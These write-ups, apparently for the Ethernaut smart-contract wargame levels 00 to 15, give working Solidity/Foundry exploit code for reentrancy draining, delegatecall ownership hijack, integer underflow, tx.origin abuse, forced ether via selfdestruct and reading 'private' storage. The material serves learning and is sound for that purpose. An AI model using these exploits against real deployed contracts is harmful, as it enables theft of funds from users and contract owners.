# Write Ups

## 00 Hello

### Solution 1

Just read the factory contract

```solidity
return address(new Instance('ethernaut0'));
```

And call the function

```solidity
function testExploit1() public {
    // password can be observed from the factory contract
    challenge.authenticate("ethernaut0");

    utils.submitLevelInstance(challengeAddress);
}
```

### Solution 2

Suppose we don't have the factory file at hand, but we can read the blockchain. We do that and call the function with the found value.

To simplify things (we can always check the lowest bit), assume we know beforehand the string is at most 31 bytes long. Since  the first slot (`0`) is giving us the value `0x65746865726e6175743000000000000000000000000000000000000000000014`, we can conclude the string is length `10` bytes (`0x14` = `20` = `2 * 20 bytes`), and the string is `0x65746865726e61757430`. Take it to CyberChef to verify is `ethernaut0`:

https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg2NTc0Njg2NTcyNmU2MTc1NzQzMA

Then we know we have to read the first 10 bytes from the slot `0` and convert it to a string in order to use it as a variable.

```solidity
// alternate solution: you can't read the factory.
// you can always read the blockchain though
function testExploit() public {

  // get the contents of the slot 0 from the challenge address,
  // assuming that this is a string with less than 32 bytes,
  // in that case, length the lowest-order byte stores the value length * 2.
  bytes32 slot0 = vm.load(challengeAddress, bytes32(uint256(0)));
  uint8 len = uint8(slot0[31]) / 2;

  bytes memory password = new bytes(len);

  for (uint8 i = 0; i < len; i++) {
    password[i] = slot0[i];
  }

  // test the found password in the contract
  challenge.authenticate(string(password));

  utils.submitLevelInstance(challengeAddress);
}
```

### References

* https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html

> In particular: if the data is at most 31 bytes long, the elements are stored
> in the higher-order bytes (left aligned) and the lowest-order byte stores the value length * 2.
> For byte arrays that store data which is 32 or more bytes long, the main slot p stores length * 2 + 1 and the data is stored as usual in `keccak256(p)`. This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).

* https://betterprogramming.pub/all-about-solidity-data-locations-part-i-storage-e50604bfc1ad
    * Long, comprehensive article
* https://www.adrianhetman.com/unboxing-evm-storage/
    * Matter of fact article
* https://blog.openzeppelin.com/ethereum-in-depth-part-2-6339cf6bddb9/
    * See `Storage` section. Includes assembly.

## 01 Fallback

To beat this level, we need to comply with

```solidity
instance.owner() == _player && address(instance).balance == 0;
```

### Solution

Notice that the `receive()` function can make `msg.sender` the owner of the contract

```solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```

Alas, we need to add some money to `contributions`:

```solidity
function contribute() public payable {
  require(msg.value < 0.001 ether);
  contributions[msg.sender] += msg.value;
  if(contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
  }
}
```

So, to solve this level:

* First, we call `contribute()` with one wei.
* Then we `call()` the contract  with another wei (`msg.value > 0` control).
* After that we are the owner of the contract and can `withdraw()` the funds.
* Now, notice that in our test we are invoking the level from a contract (as opposed from an EOA), so we need to include a `receive()` function ourselves.

```solidity
// make this true
// contributions[msg.sender] > 0
challenge.contribute{value: 1 wei}();
```

```solidity
// trigger code in receive()
(bool success,) = address(challengeAddress).call{value: 1 wei}("");
```

```solidity
// See the comment in receive() below
challenge.withdraw();
```

```solidity
// we need a receive function, since we are receiving
// the funds here and this is not an EOA
receive() external payable {}
```

### References

A review on `receive()` and `fallback()` functions

```
           send Ether
               |
         msg.data is empty?
              / \
            yes  no
            /     \
receive() exists?  fallback()
         /   \
        yes   no
        /      \
    receive()   fallback()
```

Review, why is not recommended to use the `transfer()` function

> The transfer() function in Solidity is used to send ether (the cryptocurrency used on the Ethereum network) from one address to another. This function was originally introduced as a simple way to transfer ether and was widely used in smart contracts.

> However, the transfer() function has a limitation that can cause problems in some situations. The function limits the amount of gas used to send the transaction to 2300 gas. If the receiving contract requires more than 2300 gas to process the transaction, the transfer will fail and the ether will be returned to the sender.

> This can lead to unexpected behavior and security issues, as it can allow attackers to cause denial-of-service attacks by creating contracts that require more than 2300 gas to process a transfer. For this reason, the use of transfer() is no longer recommended for sending large amounts of ether or for interacting with complex contracts.

> Instead, the recommended approach is to use the send() or call() functions, which allow for more fine-grained control over the gas limit and provide more robust error handling. Additionally, newer Solidity versions have introduced the payable modifier for functions, which makes it easier to handle incoming ether payments.

Other links for further reading

* https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
* https://docs.soliditylang.org/en/v0.8.18/contracts.html#fallback-function
* https://solidity-by-example.org/fallback/
* https://solidity-by-example.org/sending-ether/

## 01 Fallout

To beat this level, we need to comply with

```solidity
instance.owner() == _player;
```

### Solution

We see that the only code where the owner is assigned is

```solidity
/* constructor */
function Fal1out() public payable {
  owner = msg.sender;
  allocations[owner] = msg.value;
}
```

Some thoughts here, first from the 0.8.18 solidity documentation

> Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.

That means that the constructor function has to be named `constructor()`.

Also, notice that the name of the function is `Fal1out`, which differs in the 4th character with the name of the contract `Fallout`.

So, we can just assign `owner` by just invoking the function.

```solidity
challenge.Fal1out();
```

### References

* https://docs.soliditylang.org/en/v0.8.18/contracts.html#constructors

## 03 CoinFlip

To beat this level, we need to comply with

```solidity
instance.consecutiveWins() >= 10;
```

That is, we need to win the game 10 or more times.

### Solution

First of all, there is a control that prevents you to do all the coin guesses in the same block

```solidity
if (lastHash == blockValue) {
  revert();
}

lastHash = blockValue;
```

Now, the game works by taking the blockhash, divide it by a `FACTOR` (which is `2**255`) and compare it with one. As the blockhash space is [0, `2**256 - 1`], there is a 50% chance of getting a `0` or a `1`.

```solidity
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

All we have to do, then, is performing the calculation ourselves to _guess_ the right value.

Notice that we need to move to the next block on each iteration. To that end, [we leverage the forge cheatcode](https://book.getfoundry.sh/cheatcodes/roll) `vm.roll()`.

```solidity
function attack(Vm vm) public {
  // we need to be right 10 times in order to beat the level.
  for (uint i = 0; i < 10; i++) {
    // compute our "guess" in advance.
    blockValue = uint256(blockhash(block.number - 1));
    coinFlip = blockValue / FACTOR;
    side = coinFlip == 1 ? true : false;

    // we flip and give our "guess".
    coinFlipContract.flip(side);

    // let's move to the next block.
    vm.roll(block.number + 1);
  }
}
```

#### References

* https://book.getfoundry.sh/forge/cheatcodes
* https://book.getfoundry.sh/cheatcodes/

## 04 Telephone

To beat this level, we need to comply with

```solidity
instance.owner() == _player;
```

### Solution

From the [solidity documentation](https://docs.soliditylang.org/en/v0.8.19/units-and-global-variables.html#block-and-transaction-properties)

* `msg.sender` (address): sender of the message (current call)
* `tx.origin` (address): sender of the transaction (full call chain)


We write this attack contract that does the actual call to the level

```solidity
contract TelephoneAttack {
  ITelephone internal challenge;

  constructor(address _challengeAddress) {
    challenge = ITelephone(_challengeAddress);
  }

  function attack() public {
    challenge.changeOwner(msg.sender);
  }
}
```

As the function `changeOwner()` in the level is

```solidity
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

This means that the contract (or EOA) that calls `attack()` will get the ownership of the contract `_owner` parameter, provided we comply with `tx.origin != msg.sender`. This condition is true as this is the call chain:

```
tx.origin  ->                                msg.sender below         ->                                  ;

(Test EOA) -> TelephoneTest.testExploit() -> TelephoneAttack.attack() -> challenge.changeOwner(msg.sender);
```

In this case `tx.origin` would be the EOA, `msg.sender` _inside_ the `changeOwner()` function is the address of the `TelephoneAttack` contract, and the `_owner` is the `TelephoneTest` contract.

The check at the factory will work as it is perform by the test contract.

### References

* https://docs.soliditylang.org/en/v0.8.19/units-and-global-variables.html#block-and-transaction-properties
* https://docs.soliditylang.org/en/v0.8.19/security-considerations.html#tx-origin
* https://ethereum.stackexchange.com/a/1892
* https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing

## 05 Token

To beat this level, we need to comply with

```solidity
token.balanceOf(_player) > playerSupply;
```

### Solution

Notice the control at the `transfer()` function

```solidity
require(balances[msg.sender] - _value >= 0);
```

If we use the value `2**256 - 1`, then the difference will underflow, bypassing the condition:

```solidity
challenge.transfer(msg.sender, 2**256 - 1);
```

### References

* https://solidity-by-example.org/hacks/overflow/
  * Notice that for `Solidity >= 0.8`, default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.
* https://hackernoon.com/hack-solidity-integer-overflow-and-underflow

## 06 Delegation

To beat this level, we need to comply with

```solidity
parity.owner() == _player;
```

### Solution

So `Delegation.fallback()` uses `delegatecall()`.

From the solidity documentation:

> There exists a special variant of a message call, named `delegatecall` which is identical to a message call apart from the fact that the code at the target address is executed in the context (i.e. at the address) of the calling contract and `msg.sender` and `msg.value` do not change their values.

The function `delegatecall()` allows us to use code akin to using libraries in other languages.

Them, what happens here? If we manage to arrive to the `fallback()` function of `Delegation`:

```solidity
fallback() external {
  (bool result,) = address(delegate).delegatecall(msg.data);
  if (result) {
    this;
  }
}
```

Making sure that `msg.data` contains the value `abi.encodeWithSignature("pwn()")`...

... The function `Delegate.pwn()` will be executed:

```solidity
function pwn() public {
  owner = msg.sender;
}
```

Now, since this is a delegate call:

1. `msg.sender` will not be the address of `Delegation`, but the address of its caller, as the context of the calling contract does not change its value.

2. the `owner` variable in `Delegate` points to the slot `0` of the `Delegate` contract, this is relevant, we can see that the slot `o` of the `Delegation` contract is also its `owner` variable. Then the code `owner = msg.sender;` will change ownership in `Delegation`.


The solution then is just

```solidity
(bool success,) = challengeAddress.call(abi.encodeWithSignature("pwn()"));
success;
```

### References

* https://docs.soliditylang.org/en/v0.8.19/introduction-to-smart-contracts.html#delegatecall-and-libraries
* https://solidity-by-example.org/delegatecall/

## 07 Force

To beat this level, we need to comply with

```solidity
address(instance).balance > 0
```

### Solution

Right. This is the contract, BTW.

```solidity
contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

Without a `receive()` function, looks like we are in trouble.

Enter `selfdestruct()`:

> The only way to remove code from the blockchain is when a contract at that address performs the `selfdestruct` operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state. Removing the contract in theory sounds like a good idea, but it is potentially dangerous, as if someone sends Ether to removed contracts, the Ether is forever lost.

So, what we want to do is creating some contract with value on it, and `selfdestruct`it, making sure we give this level address as the destination of whatever funds it holds.

```solidity
contract ForceAttack {
  function byebye(address payable _dest) public {
    selfdestruct(_dest);
  }

  receive() external payable {}

}
```

Then we create the first contract, giving it `1 wei`.

```solidity
(bool success,) = address(attackerContract).call{value: 1 wei}("");
success;
```

And invoke the attack at `ForceAttack.byebye()`

```
attackerContract.byebye(payable(challengeAddress));
```

### References

* https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
* https://docs.soliditylang.org/en/v0.8.19/introduction-to-smart-contracts.html#deactivate-and-self-destruct

## 08 Vault

To beat this level, we need to comply with

```solidity
!instance.locked();
```

### Solution

The vault unlocks when the `locked` variable is false.

In theory one has to know its password (which is a private variable in the contract) to beat the level...

```solidity
bytes32 private password;
```

```solidity
function unlock(bytes32 _password) public {
  if (password == _password) {
    locked = false;
  }
}
```

... But blockchain data is public! Being `password` the second variable in the `Vault` contract, it is assigned to the slot `1`. Then. to beat this level, we just read the slot to get the password, and use it to unlock the vault.

```solidity
// as reading another's contract storage
// is not supported by solidity (i.e. It needs a forge "cheatcode"),
// imagine this attack being made from a forge script
bytes32 password = vm.load(challengeAddress, bytes32(uint256(1)));

// too lazy to write code for an interface? Just do the call
(bool success,) = challengeAddress.call(abi.encodeWithSignature("unlock(bytes32)", password));
success;
```

### References

* https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html

## 09 King

To beat this level, we need to comply with

```solidity
instance._king() != address(this)
```

i.e. Take away the factory's _kingship_ of the contract.

### Solution

First, let's take a look at this `receive()` function

```solidity
receive() external payable {
  require(msg.value >= prize || msg.sender == owner);
  payable(king).transfer(msg.value);
  king = msg.sender;
  prize = msg.value;
}
```

The player can be `king` if they send more ETH than the current prize, *BUT*, the `owner` can be king anytime their want, and they exercise that right just before checking the level conditions:

```solidity
(bool result,) = address(instance).call{value:0}("");
```

Also, and this is important, if the claimant passes the control of the first line, they have to transfer what they sent to the incumbent `king`.

So, to beat this level, just send a `msg.value` of ETH greater than the current price, and prevent any future claimant to fully execute the `receive()` function by not being able to receive the incumbent king's prize.

```solidity
contract KingAttacker {
  // ... SNIP

  function attack() external {
    // will be able to be king, as msg.value = prize
    // as the owner contract do have a receive() function,
    // they will be able to get their price.
    (bool result,) = challengeAddress.call{value: 0.001 ether}("");
    result;
  }

  // this contract does not have a receive function,
  // preventing the owner of the contract to take over kingship back.
}
```

### References

* https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function

## 10 Reenstrance

To beat this level, we need to comply with

```solidity
address(instance).balance == 0
```

### Solution

Look at the guard of the `withdraw()` function

```solidity
function withdraw(uint _amount) public {
  if(balances[msg.sender] >= _amount) {
    (bool result,) = msg.sender.call{value:_amount}("");
    if(result) {
      _amount;
    }
    balances[msg.sender] -= _amount;
  }
}
```

The guard will let us pass if `balances[msg.sender] >= _amount`, and then the function will call `msg.sender`, giving it the `amount` requested, balance will be updated.

In a reentrancy attack, we craft a `receive()` function such that we call the very `withdraw()` function again. That is

```
msg.sender
  -> Reentrance.withdraw()
    -> receive()
      -> Reentrance.withdraw()
        -> receive()
          -> (and so on)
```

This flow will keep working, as the guard `balances[msg.sender] >= _amount` is `true`, draining the smart contract in the process.

An example on how the attack could be written is

```solidity
function attack() external {
  // first donate something to be able to pass the guard,
  // that is balances[msg.sender] >= _amount
  target.donate{value: 0.001 ether}(address(this));

  // then trigger the withdraw function
  // the latter will call receive() below.
  target.withdraw(0.001 ether);
}

receive() external payable {
  uint targetBalance = address(target).balance;

  // this can be a clean way to drain the contract.
  // you can also just set target.withdraw() and
  // re-enter until it reverts.
  if (targetBalance >= 0.001 ether) {
    target.withdraw(0.001 ether);
  }
}
```

### References

* https://solidity-by-example.org/hacks/re-entrancy/
* https://hackernoon.com/hack-solidity-reentrancy-attack
* https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-02-reentrancy-b0c08cfcd555

## 11 Elevator

To beat this level, we need to comply with

```solidity
elevator.top();
```

### Solution

The `Elevator` contract has a boolean `top` variable, which initializes to `false`.

The `top` variable is manipulated at the `goTo()` function, which uses `Building.isLastFloor`. Notice that `Building` is an interface, so we have to implement our own contract, also that as `Building building = Building(msg.sender);` in the `goTo()` function, we have to call the latter from this contract.

The logic of the elevator has some points of interest

```solidity
if (! building.isLastFloor(_floor)) {
  floor = _floor;
  top = building.isLastFloor(floor);
}
```

* If `isLastFloor` evaluates to `true`, we cannot enter the code block, meaning that we cannot get to modify `top`.
* If `isLastFloor` evaluates to `false`, then we enter the code block, but `top` becomes `false`.

So, to beat this level, we want to write `isLastFloor` such that the first time is called, it returns `false`, then it returns `true`.

```solidity
bool flag;

// this function needs to answers false the first time,
// and then true the second one.
function isLastFloor(uint256) external returns (bool) {
  if (flag) {
    return true;
  } else {
    flag = true;
    return false;
  }
}
```

### References

* https://docs.soliditylang.org/en/v0.8.19/types.html#booleans


## 12 Privacy

To beat this level, we need to comply with

```solidity
instance.locked() == false;
```

### Solution

When the level is created, some data is added:

```solidity
data[0] = keccak256(abi.encodePacked(tx.origin,"0"));
data[1] = keccak256(abi.encodePacked(tx.origin,"1"));
data[2] = keccak256(abi.encodePacked(tx.origin,"2"));
Privacy instance = new Privacy(data);
```

To unlock the level, we must know the value of `data[2]`.

```solidity
function unlock(bytes16 _key) public {
  require(_key == bytes16(data[2]));
  locked = false;
}
```

Recall that the blockchain is public, see the [solution](#solution-9) of [08 Vault](#08-vault), we just use the cheat code `vm.load()`, which wouldn't work on-chain, but would surely work within a forge script in a real world situation.

So far so good, _but_ we want to know which slot to look at! See the contract

```solidity
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(block.timestamp);
bytes32[3] private data;
```

A naive printing of all the slots give us

```
  0x0000000000000000000000000000000000000000000000000000000000000001
  0x0000000000000000000000000000000000000000000000000000000063d6fbd8
  0x00000000000000000000000000000000000000000000000000000000fbd8ff0a
  0x975099e616af13d803200fe3021618182d07cd86f4d97d964923f15b796cf4b0
  0x2d48f4cbf31471c4a6df3f8b788f360df656dce2a0fed8c986cd3e4c22d621aa
  0x1a3aac5aaec2ef75fc3b36881192322fb7c2a2a6cfa0ace1715ad96c8d6db624
```

We can see that the variables are stored in an optimized way, with,

* slot 0: `bool public locked`.
* slot 1: `uint256 public ID`. The reason there are so maby zeroes is the assigning of `block.timestamp`.
* slot 2: `uint16 private awkwardness`, `uint8 private denomination `, `uint8 private flattening`. Pay attention at the order they are stored.
* slot 3: `bytes32[3] private data`, element `0`
* slot 4: `bytes32[3] private data`, element `1`
* slot 5: `bytes32[3] private data`, element `2`

Since `unlock()` needs `data[2]`, we are looking at the slot 5:

```solidity
// variables of this data array are at slots 3, 4, and 5
bytes16 key = bytes16(vm.load(challengeAddress, bytes32(uint256(5))));
```

### References

* https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html

## 13 Gatekeeper One

To beat this level, we need to comply with

```solidity
instance.entrant() == _player;
```

### Solution

* `gateOne()`

```solidity
require(msg.sender != tx.origin);
```

is passed through by using a proxy contract

* `gateTwo()`

```solidity
require(gasleft() % 8191 == 0);
```

just brute force it, these tests are running in a fork

* `gateThree()`

```solidity
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
```

Use `chisel` or your favorite REPL to check the operations on `0x1122334455667788`.


```bash
$ chisel

➜ _gateKey = 0x1122334455667788

➜ uint32(uint64(_gateKey))
Type: uint
├ Hex: 0x55667788

➜ uint16(uint64(_gateKey))
Type: uint
├ Hex: 0x7788

➜ uint64(_gateKey)
Type: uint
├ Hex: 0x1122334455667788

➜ uint16(uint160(0xabcd9a9e9aa1c9db991c7721a92d351db4fac990))
Type: uint
├ Hex: 0xc990
```

- `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
  - can be true with `0x1122334400007788`.

- `uint32(uint64(_gateKey)) != uint64(_gateKey)`
  - needs both to be different, which is true

- `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`
  - make `7788` equal to the last hex digits of tx.origin
  - ex: `0x1122334400007788` => `0x112233440000ea72`
  - in fact, it can be 0x100000000000ea72,
  - which makes it straighforward to get analytically.

Putting all the elements together:

```solidity
  Proxy proxy = new Proxy(challengeAddress);
  bytes8 key = bytes8(uint16(uint160(tx.origin)) + 0x1000000000000000);

  // this loop is to brute-force the gateTwo
  for (uint i = 27000; i > 0; i--) {
    if (proxy.enter{gas: i}(key)) {
      require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));
      break;
    }
  }
```

### References

* https://docs.soliditylang.org/en/v0.8.19/contracts.html#function-modifiers
* https://docs.soliditylang.org/en/v0.8.19/cheatsheet.html#global-variables
  * `gasleft() returns (uint256)`: remaining gas
* https://github.com/foundry-rs/foundry/tree/master/chisel

## 14 Gatekepper Two

To beat this level, we need to comply with

```solidity
instance.entrant() == _player;
```

### Solution

* `gateOne()`

```solidity
require(msg.sender != tx.origin);
```

is passed through by using a proxy contract

* `gateTwo()`

```solidity
uint x;
assembly { x := extcodesize(caller()) }
require(x == 0);
```

`extcodesize(caller())` retrieves the size of the call sender contract. See [Yul EVM dialect](https://docs.soliditylang.org/en/v0.8.19/yul.html#evm-dialect).

As the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf)

  7.1. Subtleties. Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.

and the foot note in that page

  During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code (as defined in H.2).

Meaning that `extcodesize(caller())` will return `0` during the creation of the contract. In other words, we need to introduce our attack **at the constructor of the contract** we are using to attack the level.

* `gateThree()`

```solidity
require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
```

This requires some algebra

```solidity
//   if Constant ^ key = 0xff
//   then key = 0xff ^ constant
//   notice that they are checking against msg.sender,
//   so compute the key at the proxy
```

The code to produce the `key` would be

```solidity
bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;
```

where the `Constant` above is `bytes8(keccak256(abi.encodePacked(address(this))))`.

Putting everything together, then, we create an attack contract

```solidity
contract Proxy {
  constructor(address _challengeAddress) {
    IGatekeeperTwo challenge = IGatekeeperTwo(_challengeAddress);
    bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;

    challenge.enter(key);
  }
}
```

And we call it like this


```solidity
// attack being performed at the construction of the contract
Proxy proxy = new Proxy(challengeAddress);
proxy;
```

### References

* https://docs.soliditylang.org/en/v0.8.19/contracts.html#function-modifiers
* https://docs.soliditylang.org/en/v0.8.19/assembly.html
* https://docs.soliditylang.org/en/v0.8.19/yul.html#evm-dialect
* https://ethereum.github.io/yellowpaper/paper.pdf
  * See "Contract Creation"

## 15 Naught Coin

To beat this level, we need to comply with

```solidity
instance.balanceOf(_player) == 0;
```

### Solution

We see the writer of the `NaughtCoin` contract inherits from `ERC20` and overrides the [`transfer()` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/ERC20.sol#L113-L117)

```solidity
function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
  super.transfer(_to, _value);
}
```

Now, the [ERC20 interface](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol) have other functions, namely [`transferFrom()`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol#L77), which has not been overriden, therefore we can avoid the `lockTokens` modifier

```solidity
uint256 balance = nc.balanceOf(address(this));

nc.approve(address(this), balance);
nc.transferFrom(address(this), tx.origin, balance);
```

### References

* https://eips.ethereum.org/EIPS/eip-20#transferfrom
* https://docs.openzeppelin.com/contracts/4.x/erc20
* https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol
* https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/ERC20.sol#L158-L163